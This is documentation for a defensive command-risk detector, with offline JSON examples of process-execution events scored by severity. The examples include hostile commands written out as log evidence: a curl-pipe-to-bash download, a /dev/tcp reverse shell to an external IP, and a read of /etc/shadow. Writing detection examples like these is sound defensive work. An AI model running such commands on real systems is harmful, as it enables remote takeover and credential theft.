# Command Risk — Reproducible Offline Examples

Each example contains a complete parent-engine input and an excerpt of the final `risk_items[0]`, using current default rules, policy and whitelist. Command strings are analyzed as log evidence and are not executed. Recompute results after configuration changes; example grades are not hard-coded rules.

Save any input as `/tmp/secweaver-exec-input.json` and run from the repository root:

```bash
python3 src/skills/risk-identification/scripts/assess.py \
  -i /tmp/secweaver-exec-input.json -o /tmp/secweaver-exec-output.json
```

## 1. Download and execute

Input:

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 443,
        "listener_process": "nginx",
        "listener_pid": 1234,
        "pid": "5678",
        "ppid": "1234",
        "exe": "/bin/bash",
        "command": [
          "/bin/sh",
          "-c",
          "curl http://example.test/a.sh | bash"
        ],
        "cwd": "/var/www/html",
        "comm": "sh",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-1"
      }
    ]
  }
}
```

Final output excerpt:

```json
{
  "severity": "P0",
  "matched_rules": [
    "external_listener_shell_exec",
    "download_and_execute",
    "download_and_execute"
  ],
  "policy_rule_id": "WEB-SHELL-001",
  "recommended_action": "isolate_host_and_investigate"
}
```

## 2. Reverse shell

Input:

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 80,
        "listener_process": "nginx",
        "listener_pid": 2001,
        "pid": "3002",
        "ppid": "2001",
        "exe": "/bin/bash",
        "command": [
          "/bin/bash",
          "-c",
          "bash -i >& /dev/tcp/203.0.113.44/4444 0>&1"
        ],
        "cwd": "/tmp",
        "comm": "bash",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-2"
      }
    ]
  }
}
```

Final output excerpt:

```json
{
  "severity": "P0",
  "matched_rules": [
    "external_listener_shell_exec",
    "reverse_shell",
    "reverse_shell",
    "reverse_shell"
  ],
  "policy_rule_id": "WEB-SHELL-001",
  "recommended_action": "isolate_host_and_investigate"
}
```

## 3. Sensitive file read

Input:

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 8080,
        "listener_process": "java",
        "listener_pid": 4000,
        "pid": "4100",
        "ppid": "4000",
        "exe": "/bin/cat",
        "command": [
          "cat",
          "/etc/shadow"
        ],
        "cwd": "/app",
        "comm": "cat",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-3"
      }
    ]
  }
}
```

Final output excerpt:

```json
{
  "severity": "P0",
  "matched_rules": [
    "sensitive_file_read"
  ],
  "policy_rule_id": "RECON-HIGH-001",
  "recommended_action": "investigate_and_contain"
}
```

## 4. Ordinary commands still require policy

Input:

```json
{
  "scenario": "S5",
  "risk_modules": [
    "exec"
  ],
  "params": {
    "host": "web-01",
    "time_start": "2026-06-21T09:00:00+08:00",
    "time_end": "2026-06-21T10:00:00+08:00"
  },
  "evidence_bundles": {
    "host_exec": [
      {
        "event_type": "exec",
        "listener_port": 443,
        "listener_process": "nginx",
        "listener_pid": 1234,
        "pid": "9999",
        "ppid": "1234",
        "exe": "/bin/ls",
        "command": [
          "ls",
          "-la",
          "/var/log/nginx"
        ],
        "cwd": "/var/log/nginx",
        "comm": "ls",
        "host": "web-01",
        "timestamp": "2026-06-21T09:15:22+08:00",
        "evidence_id": "exec-doc-4"
      }
    ]
  }
}
```

Final output excerpt:

```json
{
  "severity": "P1",
  "matched_rules": [],
  "policy_rule_id": "DEFAULT-ALERT",
  "recommended_action": "manual_review_5m"
}
```

Example 4 has no detection matches, but `DEFAULT-ALERT` yields P1/manual review, not P2/observe. Full output includes evidence, data gaps and policy context. For exec/file/connect chains, use the [offline traceability examples](../../../examples/traceability/README.md); a single risk item is not a confirmed attack chain.
